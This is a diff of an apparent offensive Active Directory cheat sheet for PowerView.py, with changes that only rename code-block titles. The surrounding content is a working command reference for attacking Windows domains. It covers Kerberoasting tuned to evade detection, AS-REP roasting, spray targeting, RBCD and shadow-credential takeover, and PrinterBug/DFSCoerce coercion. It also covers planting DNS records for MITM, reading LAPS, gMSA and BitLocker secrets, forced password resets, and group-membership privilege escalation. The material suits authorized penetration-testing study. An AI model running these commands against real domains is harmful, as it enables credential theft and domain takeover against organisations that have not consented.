@@ -49,7 +49,7 @@ fi
 
 Drop into the interactive PowerView shell against the target DC. Every subcommand below assumes you are inside this prompt.
 
-```sh title:"Interactive PowerView session, all commands run inside"
+```sh title:"PowerView.py Interactive PowerView session, all commands run inside"
 powerview $auth_target
 ```
 <!-- cheat
@@ -65,7 +65,7 @@ import pvpy_auth
 
 Returns users whose `badPwdCount` is zero - one spray attempt won't tip them toward lockout. Low-noise starting set.
 
-```sh title:"Zero badPwdCount, safe to spray once"
+```sh title:"PowerView.py Zero badPwdCount, safe to spray once"
 Get-DomainUser -Where 'badPwdCount contains 0'
 ```
 <!-- cheat -->
@@ -74,7 +74,7 @@ Get-DomainUser -Where 'badPwdCount contains 0'
 
 Lists every account with an SPN plus its supported encryption types. AES-capable accounts pair well with `-Opsec` Kerberoasting.
 
-```sh title:"SPN accounts with msDS-SupportedEncryptionTypes"
+```sh title:"PowerView.py SPN accounts with msDS-SupportedEncryptionTypes"
 Get-DomainUser -SPN -Select samaccountname,msDS-SupportedEncryptionTypes
 ```
 <!-- cheat -->
@@ -83,7 +83,7 @@ Get-DomainUser -SPN -Select samaccountname,msDS-SupportedEncryptionTypes
 
 Pulls accounts flagged `adminCount=1` - the historic marker for protected admin group members. Fast high-value target map.
 
-```sh title:"adminCount=1, high-value targets"
+```sh title:"PowerView.py adminCount=1, high-value targets"
 Get-DomainUser -AdminCount
 ```
 <!-- cheat -->
@@ -92,7 +92,7 @@ Get-DomainUser -AdminCount
 
 Finds accounts with Kerberos pre-auth disabled. AS-REPs can be requested anonymously and cracked offline.
 
-```sh title:"DONT_REQ_PREAUTH set, AS-REP crackable offline"
+```sh title:"PowerView.py DONT_REQ_PREAUTH set, AS-REP crackable offline"
 Get-DomainUser -PreAuthNotRequired
 ```
 <!-- cheat -->
@@ -101,7 +101,7 @@ Get-DomainUser -PreAuthNotRequired
 
 Lists users trusted for unconstrained delegation. Any TGT sent here is reusable - including DC machine TGTs after coercion.
 
-```sh title:"TRUSTED_FOR_DELEGATION, reusable TGT primitive"
+```sh title:"PowerView.py TRUSTED_FOR_DELEGATION, reusable TGT primitive"
 Get-DomainUser -Unconstrained
 ```
 <!-- cheat -->
@@ -110,7 +110,7 @@ Get-DomainUser -Unconstrained
 
 Returns users with `TrustedToAuthForDelegation`. The principal can S4U2Proxy to its allowed SPNs as any user.
 
-```sh title:"S4U2Proxy-capable principals (constrained delegation)"
+```sh title:"PowerView.py S4U2Proxy-capable principals (constrained delegation)"
 Get-DomainUser -TrustedToAuth
 ```
 <!-- cheat -->
@@ -119,7 +119,7 @@ Get-DomainUser -TrustedToAuth
 
 Surfaces currently-locked accounts. Skip these during sprays and flag if you spot a lockout sweep in progress.
 
-```sh title:"Currently locked accounts, do not spray"
+```sh title:"PowerView.py Currently locked accounts, do not spray"
 Get-DomainUser -LockedOut
 ```
 <!-- cheat -->
@@ -128,7 +128,7 @@ Get-DomainUser -LockedOut
 
 Lists disabled users. Often hides stale SPNs, pre-auth-disabled relics, and forgotten service identities worth resurrecting.
 
-```sh title:"Disabled users, gold mine for stale SPNs / pre-auth"
+```sh title:"PowerView.py Disabled users, gold mine for stale SPNs / pre-auth"
 Get-DomainUser -Disabled
 ```
 <!-- cheat -->
@@ -137,7 +137,7 @@ Get-DomainUser -Disabled
 
 Returns accounts whose password has expired - stale identities that may carry weak or known credentials.
 
-```sh title:"Expired passwords, often stale or weak creds"
+```sh title:"PowerView.py Expired passwords, often stale or weak creds"
 Get-DomainUser -PassExpired
 ```
 <!-- cheat -->
@@ -146,7 +146,7 @@ Get-DomainUser -PassExpired
 
 Finds users set as principals in `msDS-AllowedToActOnBehalfOfOtherIdentity`. Reveals existing RBCD takeover paths.
 
-```sh title:"Already configured as RBCD principal"
+```sh title:"PowerView.py Already configured as RBCD principal"
 Get-DomainUser -RBCD
 ```
 <!-- cheat -->
@@ -155,7 +155,7 @@ Get-DomainUser -RBCD
 
 Lists users with `msDS-KeyCredentialLink` populated - usually evidence of a shadow-credentials primitive already in place.
 
-```sh title:"msDS-KeyCredentialLink set, shadow creds primitive"
+```sh title:"PowerView.py msDS-KeyCredentialLink set, shadow creds primitive"
 Get-DomainUser -ShadowCred
 ```
 <!-- cheat -->
@@ -164,7 +164,7 @@ Get-DomainUser -ShadowCred
 
 Search by `department` attribute. Pivot from org chart to specific business units.
 
-```sh title:"Pivot by department attribute"
+```sh title:"PowerView.py Pivot by department attribute"
 Get-DomainUser -Department "$department"
 ```
 <!-- cheat
@@ -175,7 +175,7 @@ var department --- --header "Department name (e.g. IT)"
 
 Returns members of the named group. Quick way to enumerate any privileged or sensitive group.
 
-```sh title:"Members of a target group"
+```sh title:"PowerView.py Members of a target group"
 Get-DomainUser -MemberOf "$group"
 ```
 <!-- cheat
@@ -188,7 +188,7 @@ var group --- --header "Group name (e.g. Domain Admins)"
 
 Lists computers with LAPS populated. If your principal can read `ms-Mcs-AdmPwd`, the local admin password comes back directly.
 
-```sh title:"LAPS-protected hosts, password readable if ACL allows"
+```sh title:"PowerView.py LAPS-protected hosts, password readable if ACL allows"
 Get-DomainComputer -LAPS
 ```
 <!-- cheat -->
@@ -197,7 +197,7 @@ Get-DomainComputer -LAPS
 
 Finds unconstrained-delegation hosts excluding DCs. These can be coerced and used to capture TGTs from arbitrary principals.
 
-```sh title:"Coercion targets that aren't DCs"
+```sh title:"PowerView.py Coercion targets that aren't DCs"
 Get-DomainComputer -Unconstrained -ExcludeDCs
 ```
 <!-- cheat -->
@@ -206,7 +206,7 @@ Get-DomainComputer -Unconstrained -ExcludeDCs
 
 Lists computers registered as print servers - the classic PrinterBug coercion surface.
 
-```sh title:"Print servers, PrinterBug coercion candidates"
+```sh title:"PowerView.py Print servers, PrinterBug coercion candidates"
 Get-DomainComputer -Printers
 ```
 <!-- cheat -->
@@ -215,7 +215,7 @@ Get-DomainComputer -Printers
 
 Returns hosts running unsupported Windows versions. Usually unpatched and easy pivots.
 
-```sh title:"Unsupported Windows versions, soft pivots"
+```sh title:"PowerView.py Unsupported Windows versions, soft pivots"
 Get-DomainComputer -Obsolete
 ```
 <!-- cheat -->
@@ -224,7 +224,7 @@ Get-DomainComputer -Obsolete
 
 Renders computer objects alongside resolved IPs in a table - quick target map straight out of DNS.
 
-```sh title:"Computer + resolved IP, fast target map"
+```sh title:"PowerView.py Computer + resolved IP, fast target map"
 Get-DomainComputer -IncludeIP -Properties dnshostname -TableView
 ```
 <!-- cheat -->
@@ -233,7 +233,7 @@ Get-DomainComputer -IncludeIP -Properties dnshostname -TableView
 
 Finds hosts flagged pre-Windows 2000 compatible. Often legacy/misconfigured and worth a closer look.
 
-```sh title:"Legacy pre-Windows 2000 compatible hosts"
+```sh title:"PowerView.py Legacy pre-Windows 2000 compatible hosts"
 Get-DomainComputer -Pre2K
 ```
 <!-- cheat -->
@@ -242,7 +242,7 @@ Get-DomainComputer -Pre2K
 
 Lists computers with a BitLocker recovery key stored in AD. Readable keys unlock encrypted volumes.
 
-```sh title:"BitLocker recovery keys stored in AD"
+```sh title:"PowerView.py BitLocker recovery keys stored in AD"
 Get-DomainComputer -BitLocker
 ```
 <!-- cheat -->
@@ -251,7 +251,7 @@ Get-DomainComputer -BitLocker
 
 Returns computers whose gMSA password the current principal can read. Decoded directly to NT hash by PowerView.
 
-```sh title:"gMSA passwords readable as current principal"
+```sh title:"PowerView.py gMSA passwords readable as current principal"
 Get-DomainComputer -GMSAPassword
 ```
 <!-- cheat -->
@@ -262,7 +262,7 @@ Get-DomainComputer -GMSAPassword
 
 Enumerates members of a target group. Run against privileged groups to identify operators worth targeting.
 
-```sh title:"Members of group, find operators worth targeting"
+```sh title:"PowerView.py Members of group, find operators worth targeting"
 Get-DomainGroupMember -Identity "$group"
 ```
 <!-- cheat
@@ -273,7 +273,7 @@ var group --- --header "Group name (e.g. Domain Admins)"
 
 Lists every group the user is a member of - effective access and inherited permissions in one view.
 
-```sh title:"Every group a user inherits access from"
+```sh title:"PowerView.py Every group a user inherits access from"
 Get-DomainGroup -MemberIdentity $target_user
 ```
 <!-- cheat
@@ -284,7 +284,7 @@ var target_user --- --header "User samAccountName"
 
 Reads the DACL and resolves GUIDs to readable rights. The first step in finding misconfigured permissions.
 
-```sh title:"DACL with GUIDs resolved to readable rights"
+```sh title:"PowerView.py DACL with GUIDs resolved to readable rights"
 Get-DomainObjectAcl -Identity "$identity" -ResolveGUIDs
 ```
 <!-- cheat
@@ -295,7 +295,7 @@ var identity --- --header "Object identity (samAccountName, DN, SID)"
 
 Filters ACEs to those granted to a specific SID. Answers "what can this principal do to that object?" in one shot.
 
-```sh title:"Filter ACEs by SecurityIdentifier"
+```sh title:"PowerView.py Filter ACEs by SecurityIdentifier"
 Get-DomainObjectAcl -Identity $identity -SecurityIdentifier $sid
 ```
 <!-- cheat
@@ -307,7 +307,7 @@ var sid --- --header "SecurityIdentifier (S-1-5-21-...)"
 
 Returns the security-descriptor owner of an object. Owners hold implicit `WriteDacl`, so this often reveals control paths.
 
-```sh title:"Owner holds implicit WriteDacl, reveals control paths"
+```sh title:"PowerView.py Owner holds implicit WriteDacl, reveals control paths"
 Get-DomainObjectOwner -Identity "$identity"
 ```
 <!-- cheat
@@ -320,7 +320,7 @@ var identity --- --header "Object identity"
 
 Enumerates the AD-integrated DNS zones in the current domain. The starting point for DNS recon.
 
-```sh title:"AD-integrated DNS zones in current domain"
+```sh title:"PowerView.py AD-integrated DNS zones in current domain"
 Get-DomainDNSZone
 ```
 <!-- cheat -->
@@ -329,7 +329,7 @@ Get-DomainDNSZone
 
 Lists DNS zones stored in the forest-wide partition. Often exposes zones invisible at the domain level.
 
-```sh title:"Forest-partition DNS zones, often missed at domain level"
+```sh title:"PowerView.py Forest-partition DNS zones, often missed at domain level"
 Get-DomainDNSZone -Forest
 ```
 <!-- cheat -->
@@ -338,7 +338,7 @@ Get-DomainDNSZone -Forest
 
 Dumps the records of a given DNS zone. Map hosts and services without sending any probes.
 
-```sh title:"Dump records in a zone (zero-noise host mapping)"
+```sh title:"PowerView.py Dump records in a zone (zero-noise host mapping)"
 Get-DomainDNSRecord -ZoneName $zone
 ```
 <!-- cheat
@@ -349,7 +349,7 @@ var zone --- --header "DNS zone (e.g. domain.local)"
 
 Creates a new A record in the configured zone. Stages WPAD, MITM, or coercion redirects.
 
-```sh title:"Plant A record for WPAD / MITM / coercion"
+```sh title:"PowerView.py Plant A record for WPAD / MITM / coercion"
 Add-DomainDNSRecord -RecordName $record -RecordAddress $lhost
 ```
 <!-- cheat
@@ -361,7 +361,7 @@ var record --- --header "Record name"
 
 Soft-disables a DNS record by pointing it to an invalid address. Removes the entry without losing the object.
 
-```sh title:"Soft-disable without deleting the object"
+```sh title:"PowerView.py Soft-disable without deleting the object"
 Disable-DomainDNSRecord -RecordName $record
 ```
 <!-- cheat
@@ -374,7 +374,7 @@ var record --- --header "Record name to disable"
 
 Requests service tickets for every SPN-bearing account and returns crackable hashes. Standard offline attack on service accounts.
 
-```sh title:"Roast every SPN, crack hashes offline"
+```sh title:"PowerView.py Roast every SPN, crack hashes offline"
 Invoke-Kerberoast
 ```
 <!-- cheat -->
@@ -383,7 +383,7 @@ Invoke-Kerberoast
 
 Requests AES-encrypted service tickets only - looks normal to detections tuned for RC4 roasting. Trades speed for stealth.
 
-```sh title:"AES-only roast, evades RC4-tuned detections"
+```sh title:"PowerView.py AES-only roast, evades RC4-tuned detections"
 Invoke-Kerberoast -Opsec
 ```
 <!-- cheat -->
@@ -392,7 +392,7 @@ Invoke-Kerberoast -Opsec
 
 Requests AS-REPs for every pre-auth-disabled account. Works without valid credentials when fed a userlist.
 
-```sh title:"Crackable AS-REP hashes for pre-auth-disabled accounts"
+```sh title:"PowerView.py Crackable AS-REP hashes for pre-auth-disabled accounts"
 Invoke-ASREPRoast
 ```
 <!-- cheat -->
@@ -403,7 +403,7 @@ Invoke-ASREPRoast
 
 Searches AD for accounts with `msDS-AllowedToActOnBehalfOfOtherIdentity` set. Reveals existing RBCD paths.
 
-```sh title:"Existing AllowedToActOnBehalfOfOtherIdentity entries"
+```sh title:"PowerView.py Existing AllowedToActOnBehalfOfOtherIdentity entries"
 Get-DomainRBCD
 ```
 <!-- cheat -->
@@ -412,7 +412,7 @@ Get-DomainRBCD
 
 Writes an RBCD entry so the attacker-controlled computer can S4U2Proxy to the target as any user. Classic RBCD takeover.
 
-```sh title:"delegate_from can impersonate any user to delegate_to"
+```sh title:"PowerView.py delegate_from can impersonate any user to delegate_to"
 Set-DomainRBCD -Identity $target -DelegateFrom $attacker
 ```
 <!-- cheat
@@ -426,7 +426,7 @@ var attacker --- --header "Attacker computer (e.g. attackercomputer$)"
 
 Lists ADCS templates with known-bad configurations and resolves their ACL SIDs. Targets for ESC1/2/3/etc.
 
-```sh title:"ESC-vulnerable templates with resolved ACL SIDs"
+```sh title:"PowerView.py ESC-vulnerable templates with resolved ACL SIDs"
 Get-DomainCATemplate -Vulnerable -ResolveSIDs
 ```
 <!-- cheat -->
@@ -435,7 +435,7 @@ Get-DomainCATemplate -Vulnerable -ResolveSIDs
 
 Enumerates CAs in the forest and runs web-enrollment / config checks. Quick ADCS surface health check.
 
-```sh title:"CA list with web enrollment + config checks"
+```sh title:"PowerView.py CA list with web enrollment + config checks"
 Get-DomainCA -CheckAll
 ```
 <!-- cheat -->
@@ -446,7 +446,7 @@ Get-DomainCA -CheckAll
 
 Adds a key credential to `msDS-KeyCredentialLink`. The attacker can then PKINIT as the target.
 
-```sh title:"Plant key credential for PKINIT-as-target"
+```sh title:"PowerView.py Plant key credential for PKINIT-as-target"
 Set-ShadowCredential -Identity $target -Add
 ```
 <!-- cheat
@@ -457,7 +457,7 @@ var target --- --header "Target identity"
 
 Reads the key credentials currently set on a target. Audit or cleanup primitive.
 
-```sh title:"Read existing KeyCredentialLink entries"
+```sh title:"PowerView.py Read existing KeyCredentialLink entries"
 Get-ShadowCredential -Identity $target
 ```
 <!-- cheat
@@ -470,7 +470,7 @@ var target --- --header "Target identity (e.g. DC01$)"
 
 Enumerates group-managed service accounts. If the current principal can read the managed password, it comes back here.
 
-```sh title:"gMSAs in domain, auto-decoded if readable"
+```sh title:"PowerView.py gMSAs in domain, auto-decoded if readable"
 Get-DomainGMSA
 ```
 <!-- cheat -->
@@ -479,7 +479,7 @@ Get-DomainGMSA
 
 Lists delegated managed service accounts - the newer cousin of gMSA, worth checking on modern domains.
 
-```sh title:"dMSAs in domain (BadSuccessor primitive)"
+```sh title:"PowerView.py dMSAs in domain (BadSuccessor primitive)"
 Get-DomainDMSA
 ```
 <!-- cheat -->
@@ -490,7 +490,7 @@ Get-DomainDMSA
 
 Queries logon sessions over SMB. Reveals who is currently signed in for session hunting.
 
-```sh title:"NetSessionEnum, who is signed in right now"
+```sh title:"PowerView.py NetSessionEnum, who is signed in right now"
 Get-NetSession -Computer $computer
 ```
 <!-- cheat
@@ -501,7 +501,7 @@ var computer --- --header "Remote computer (e.g. DC01)"
 
 Enumerates SMB shares exposed by a remote host. Step zero before file hunting.
 
-```sh title:"SMB shares on host, step zero for file hunting"
+```sh title:"PowerView.py SMB shares on host, step zero for file hunting"
 Get-NetShare -Computer $computer
 ```
 <!-- cheat
@@ -512,7 +512,7 @@ var computer --- --header "Remote computer"
 
 Lists services currently running on a remote host. Spot EDR, agents, and service-account abuse openings.
 
-```sh title:"Running services, spot EDR / service-account abuse"
+```sh title:"PowerView.py Running services, spot EDR / service-account abuse"
 Get-NetService -Computer $computer -IsRunning
 ```
 <!-- cheat
@@ -523,7 +523,7 @@ var computer --- --header "Remote computer"
 
 Pulls recent successful-logon events from a remote security log. Maps who has been touching the host.
 
-```sh title:"Recent 4624 events, who has been on this host"
+```sh title:"PowerView.py Recent 4624 events, who has been on this host"
 Get-EventLog -Computer $computer -EventId $eventid -MaxEvents $max
 ```
 <!-- cheat
@@ -536,7 +536,7 @@ var max := 50
 
 Enumerates running processes on a remote host. Finds interactive users and EDR agents.
 
-```sh title:"Remote process list, spot users and EDR agents"
+```sh title:"PowerView.py Remote process list, spot users and EDR agents"
 Get-NetProcess -Computer $computer
 ```
 <!-- cheat
@@ -547,7 +547,7 @@ var computer --- --header "Remote computer"
 
 Sweeps the domain for machines where the current principal is local admin. Lateral-movement target list in one call.
 
-```sh title:"Domain-wide local admin sweep for current principal"
+```sh title:"PowerView.py Domain-wide local admin sweep for current principal"
 Find-LocalAdminAccess
 ```
 <!-- cheat -->
@@ -558,7 +558,7 @@ Find-LocalAdminAccess
 
 Triggers the Print Spooler RPC bug to force the target into authenticating to your listener. Classic machine-account capture primitive.
 
-```sh title:"MS-RPRN coercion, capture/relay target machine auth"
+```sh title:"PowerView.py MS-RPRN coercion, capture/relay target machine auth"
 Invoke-PrinterBug -Target $target -Listener $lhost
 ```
 <!-- cheat
@@ -570,7 +570,7 @@ var target --- --header "Coercion target (e.g. DC01)"
 
 Forces the target to authenticate via the DFS-NS RPC interface. Works when PrinterBug and PetitPotam are patched.
 
-```sh title:"MS-DFSNM coercion, fallback when PrinterBug is patched"
+```sh title:"PowerView.py MS-DFSNM coercion, fallback when PrinterBug is patched"
 Invoke-DFSCoerce -Target $target -Listener $lhost
 ```
 <!-- cheat
@@ -584,7 +584,7 @@ var target --- --header "Coercion target"
 
 Overwrites a single attribute on a domain object. Building block for many AD abuses (SPN write, description tampering, etc.).
 
-```sh title:"Overwrite attribute (destructive single-value set)"
+```sh title:"PowerView.py Overwrite attribute (destructive single-value set)"
 Set-DomainObject -Identity $identity -Set '$attribute=$value'
 ```
 <!-- cheat
@@ -597,7 +597,7 @@ var value --- --header "Attribute value"
 
 Appends to a multi-valued attribute instead of overwriting. Add a new SPN without nuking existing ones.
 
-```sh title:"Append to multi-value attribute, non-destructive"
+```sh title:"PowerView.py Append to multi-value attribute, non-destructive"
 Set-DomainObject -Identity $identity -Append '$attribute=$value'
 ```
 <!-- cheat
@@ -610,7 +610,7 @@ var value --- --header "Value to append"
 
 Clears an attribute on a domain object. Cleanup primitive or SPN reset.
 
-```sh title:"Clear attribute, cleanup / reset primitive"
+```sh title:"PowerView.py Clear attribute, cleanup / reset primitive"
 Set-DomainObject -Identity $identity -Clear $attribute
 ```
 <!-- cheat
@@ -622,7 +622,7 @@ var attribute --- --header "Attribute name to clear"
 
 Sets an attribute's value from a local file. Useful for stuffing binary blobs like `msDS-KeyCredentialLink` payloads.
 
-```sh title:"Load binary blob from file (e.g. KeyCredentialLink)"
+```sh title:"PowerView.py Load binary blob from file (e.g. KeyCredentialLink)"
 Set-DomainObject -Identity $identity -Set '$attribute=@$filepath'
 ```
 <!-- cheat
@@ -635,7 +635,7 @@ var filepath --- --header "Path to file (e.g. /path/to/file)"
 
 Resets a user's password to a new value. Requires `User-Force-Change-Password` or equivalent ACL on the target.
 
-```sh title:"Force-reset, needs Force-Change-Password right"
+```sh title:"PowerView.py Force-reset, needs Force-Change-Password right"
 Set-DomainUserPassword -Identity $target_user -AccountPassword '$new_password'
 ```
 <!-- cheat
@@ -647,7 +647,7 @@ var target_user --- --header "Target user"
 
 Moves a domain object to a different OU by rewriting its DN. Stages OU-linked GPO attacks.
 
-```sh title:"Move object into target OU (GPO link staging)"
+```sh title:"PowerView.py Move object into target OU (GPO link staging)"
 Set-DomainObjectDN -Identity $identity -DestinationDN "$dn"
 ```
 <!-- cheat
@@ -661,7 +661,7 @@ var dn --- --header "Destination DN (e.g. OU=IT,DC=domain,DC=local)"
 
 Renders query results as a console table for the chosen properties. The most readable default for ad-hoc exploration.
 
-```sh title:"Console table view for chosen properties"
+```sh title:"PowerView.py Console table view for chosen properties"
 Get-DomainUser -Properties $properties -TableView
 ```
 <!-- cheat
@@ -672,7 +672,7 @@ var properties := samaccountname,description
 
 Renders results as a Markdown table - ready to paste into notes or reports.
 
-```sh title:"Markdown table for notes / reports"
+```sh title:"PowerView.py Markdown table for notes / reports"
 Get-DomainUser -Properties $properties -TableView md
 ```
 <!-- cheat
@@ -683,7 +683,7 @@ var properties := samaccountname,description
 
 Emits results as CSV. Pipe into scripts or spreadsheets for bulk wrangling.
 
-```sh title:"CSV output for piping / spreadsheets"
+```sh title:"PowerView.py CSV output for piping / spreadsheets"
 Get-DomainUser -Properties $properties -TableView csv
 ```
 <!-- cheat
@@ -694,7 +694,7 @@ var properties := samaccountname,description
 
 Filters where the named attribute contains the given substring. Loose match for free-form fields.
 
-```sh title:"Loose substring match on attribute"
+```sh title:"PowerView.py Loose substring match on attribute"
 Get-DomainUser -Where 'samaccountname contains $value'
 ```
 <!-- cheat
@@ -705,7 +705,7 @@ var value --- --header "Substring to match (e.g. admin)"
 
 Filters to exact, case-insensitive matches on the attribute.
 
-```sh title:"Exact (case-insensitive) attribute match"
+```sh title:"PowerView.py Exact (case-insensitive) attribute match"
 Get-DomainUser -Where 'samaccountname eq $value'
 ```
 <!-- cheat
@@ -716,7 +716,7 @@ var value --- --header "Exact value (e.g. Administrator)"
 
 Filters where the value appears within the attribute - effectively a reverse-`contains` for token lookups.
 
-```sh title:"Token lookup inside attribute (reverse contains)"
+```sh title:"PowerView.py Token lookup inside attribute (reverse contains)"
 Get-DomainUser -Where 'description in $value'
 ```
 <!-- cheat
@@ -727,7 +727,7 @@ var value --- --header "Token to look for (e.g. password)"
 
 Sorts the result set by the chosen attribute. Pairs with table or CSV output for tidy reports.
 
-```sh title:"Sort by attribute, pair with table/CSV"
+```sh title:"PowerView.py Sort by attribute, pair with table/CSV"
 Get-DomainUser -Properties $properties -SortBy $sortby
 ```
 <!-- cheat
@@ -739,7 +739,7 @@ var sortby := lastLogon
 
 Returns the count of enabled accounts rather than the rows. Quick sanity check on domain size.
 
-```sh title:"Enabled-user count, fast domain sanity check"
+```sh title:"PowerView.py Enabled-user count, fast domain sanity check"
 Get-DomainUser -Enabled -Count
 ```
 <!-- cheat -->
@@ -750,7 +750,7 @@ Get-DomainUser -Enabled -Count
 
 Reads the domain object including useful policy properties - check `ms-DS-MachineAccountQuota` before adding machine accounts.
 
-```sh title:"Domain object + policy props (e.g. MachineAccountQuota)"
+```sh title:"PowerView.py Domain object + policy props (e.g. MachineAccountQuota)"
 Get-Domain -Properties $properties
 ```
 <!-- cheat
@@ -761,7 +761,7 @@ var properties := ms-DS-MachineAccountQuota
 
 Lists the DCs visible from this principal. Pick a DC before further operations.
 
-```sh title:"Visible DCs, pick one for follow-up ops"
+```sh title:"PowerView.py Visible DCs, pick one for follow-up ops"
 Get-DomainController -Properties dnshostname,operatingsystem
 ```
 <!-- cheat -->
@@ -770,7 +770,7 @@ Get-DomainController -Properties dnshostname,operatingsystem
 
 Enumerates organisational units in the domain. Pair with `-Writable` to find OUs you can manipulate.
 
-```sh title:"OUs in domain, GPLink resolved"
+```sh title:"PowerView.py OUs in domain, GPLink resolved"
 Get-DomainOU -ResolveGPLink
 ```
 <!-- cheat -->
@@ -779,7 +779,7 @@ Get-DomainOU -ResolveGPLink
 
 Returns OUs the current principal can write to - building block for GPO link abuse.
 
-```sh title:"OUs writable by current principal (GPO link abuse)"
+```sh title:"PowerView.py OUs writable by current principal (GPO link abuse)"
 Get-DomainOU -Writable
 ```
 <!-- cheat -->
@@ -788,7 +788,7 @@ Get-DomainOU -Writable
 
 Fetches any domain object by identity or LDAP filter. The escape hatch when no dedicated `Get-*` fits.
 
-```sh title:"Escape hatch for any object by identity/filter"
+```sh title:"PowerView.py Escape hatch for any object by identity/filter"
 Get-DomainObject -Identity "$identity"
 ```
 <!-- cheat
@@ -799,7 +799,7 @@ var identity --- --header "Object identity (e.g. DC01$)"
 
 Lists objects in the Deleted Objects container. Step zero before restoring a removed object.
 
-```sh title:"Deleted Objects container, restore candidates"
+```sh title:"PowerView.py Deleted Objects container, restore candidates"
 Get-DomainObject -Deleted
 ```
 <!-- cheat -->
@@ -808,7 +808,7 @@ Get-DomainObject -Deleted
 
 Restores a tombstoned object back into the directory, optionally into a chosen target OU.
 
-```sh title:"Reanimate tombstoned object into target OU"
+```sh title:"PowerView.py Reanimate tombstoned object into target OU"
 Restore-DomainObject -Identity $identity -TargetPath "$dn"
 ```
 <!-- cheat
@@ -820,7 +820,7 @@ var dn --- --header "Target DN (e.g. OU=Users,DC=domain,DC=local)"
 
 Rewrites the security-descriptor owner of a target object. Owners hold implicit `WriteDacl` - classic ACL takeover step.
 
-```sh title:"WriteOwner abuse, take ownership of target"
+```sh title:"PowerView.py WriteOwner abuse, take ownership of target"
 Set-DomainObjectOwner -TargetIdentity "$target" -PrincipalIdentity $principal
 ```
 <!-- cheat
@@ -832,7 +832,7 @@ var principal --- --header "New owner principal (e.g. lowpriv)"
 
 Drops PowerView's in-memory LDAP query cache so the next query hits the wire. Chases fresh changes.
 
-```sh title:"Drop LDAP cache to hit the wire next query"
+```sh title:"PowerView.py Drop LDAP cache to hit the wire next query"
 Clear-Cache
 ```
 <!-- cheat -->
@@ -843,7 +843,7 @@ Clear-Cache
 
 Disables a domain account. Freeze a target during an op or clean up a rogue identity.
 
-```sh title:"Set ACCOUNTDISABLE bit on target"
+```sh title:"PowerView.py Set ACCOUNTDISABLE bit on target"
 Disable-ADAccount -Identity $target_user
 ```
 <!-- cheat
@@ -854,7 +854,7 @@ var target_user --- --header "Target account"
 
 Clears `ACCOUNTDISABLE` on a disabled account. Wakes a stale identity for an attack chain.
 
-```sh title:"Clear ACCOUNTDISABLE bit, wake stale account"
+```sh title:"PowerView.py Clear ACCOUNTDISABLE bit, wake stale account"
 Enable-ADAccount -Identity $target_user
 ```
 <!-- cheat
@@ -865,7 +865,7 @@ var target_user --- --header "Target account"
 
 Clears the lockout flag on an account. Use after over-spraying a real user.
 
-```sh title:"Unlock account after aggressive spray"
+```sh title:"PowerView.py Unlock account after aggressive spray"
 Unlock-ADAccount -Identity $target_user
 ```
 <!-- cheat
@@ -876,7 +876,7 @@ var target_user --- --header "Locked account (e.g. lockeduser)"
 
 Re-authenticates the current PowerView session as a different user without exiting. Pivot between captured creds in-place.
 
-```sh title:"Swap identity inside the same PowerView session"
+```sh title:"PowerView.py Swap identity inside the same PowerView session"
 Login-As -Username $target_user -Domain $domain -Password '$new_password'
 ```
 <!-- cheat
@@ -891,7 +891,7 @@ var target_user --- --header "Username"
 
 Creates a new domain user. Requires sufficient ACL rights on the target container.
 
-```sh title:"Create new user, needs container write rights"
+```sh title:"PowerView.py Create new user, needs container write rights"
 Add-DomainUser -UserName $target_user -Password '$new_password'
 ```
 <!-- cheat
@@ -903,7 +903,7 @@ var target_user --- --header "New username"
 
 Deletes a domain user. Watch out for tombstone behaviour and dependencies.
 
-```sh title:"Delete user (mind tombstones + dependencies)"
+```sh title:"PowerView.py Delete user (mind tombstones + dependencies)"
 Remove-DomainUser -Identity $target_user
 ```
 <!-- cheat
@@ -914,7 +914,7 @@ var target_user --- --header "User to delete"
 
 Adds a machine account to the domain - bounded by `ms-DS-MachineAccountQuota`. Building block for RBCD and shadow creds.
 
-```sh title:"Create machine account (needs MachineAccountQuota > 0)"
+```sh title:"PowerView.py Create machine account (needs MachineAccountQuota > 0)"
 Add-DomainComputer -ComputerName $rhost_name -ComputerPass $new_password
 ```
 <!-- cheat
@@ -926,7 +926,7 @@ var rhost_name --- --header "Computer name (no trailing $)"
 
 Deletes a machine account. Cleanup after RBCD or shadow-creds chains.
 
-```sh title:"Clean up attacker-created machine account"
+```sh title:"PowerView.py Clean up attacker-created machine account"
 Remove-DomainComputer -ComputerName $rhost_name
 ```
 <!-- cheat
@@ -937,7 +937,7 @@ var rhost_name --- --header "Computer name"
 
 Forces a new password onto a computer account. Reset machine creds you control or recover an owned host.
 
-```sh title:"Force-reset machine account password"
+```sh title:"PowerView.py Force-reset machine account password"
 Set-DomainComputerPassword -Identity '$rhost_name' -AccountPassword '$new_password'
 ```
 <!-- cheat
@@ -949,7 +949,7 @@ var rhost_name --- --header "Computer (e.g. COMPUTER01$)"
 
 Creates a new security group. Stage a group for GPO or ACL abuse.
 
-```sh title:"Stage new security group for ACL/GPO abuse"
+```sh title:"PowerView.py Stage new security group for ACL/GPO abuse"
 Add-DomainGroup -Identity "$group"
 ```
 <!-- cheat
@@ -960,7 +960,7 @@ var group --- --header "New group name"
 
 Adds a principal to a target group. Classic privesc primitive once you can write to the group.
 
-```sh title:"Membership privesc, write-to-group primitive"
+```sh title:"PowerView.py Membership privesc, write-to-group primitive"
 Add-DomainGroupMember -Identity "$group" -Members $target_user
 ```
 <!-- cheat
@@ -972,7 +972,7 @@ var target_user --- --header "Member to add"
 
 Removes a principal from a group. Cleanup or competitor kick.
 
-```sh title:"Drop membership, cleanup after privesc"
+```sh title:"PowerView.py Drop membership, cleanup after privesc"
 Remove-DomainGroupMember -Identity "$group" -Members $target_user
 ```
 <!-- cheat
@@ -984,7 +984,7 @@ var target_user --- --header "Member to remove"
 
 Creates a new organisational unit. Pair with GPO link primitives to attack accounts moved into it.
 
-```sh title:"Stage new OU for GPO link attacks"
+```sh title:"PowerView.py Stage new OU for GPO link attacks"
 Add-DomainOU -Identity "$ou"
 ```
 <!-- cheat
@@ -995,7 +995,7 @@ var ou --- --header "New OU name"
 
 Deletes an OU. Be careful - child objects move or vanish depending on flags.
 
-```sh title:"Delete OU (children move or vanish per flags)"
+```sh title:"PowerView.py Delete OU (children move or vanish per flags)"
 Remove-DomainOU -Identity "$ou"
 ```
 <!-- cheat
@@ -1006,7 +1006,7 @@ var ou --- --header "OU to delete"
 
 Deletes any domain object by identity. Catch-all for unusual classes.
 
-```sh title:"Catch-all delete for any object class"
+```sh title:"PowerView.py Catch-all delete for any object class"
 Remove-DomainObject -Identity $identity
 ```
 <!-- cheat
@@ -1019,7 +1019,7 @@ var identity --- --header "Object to delete"
 
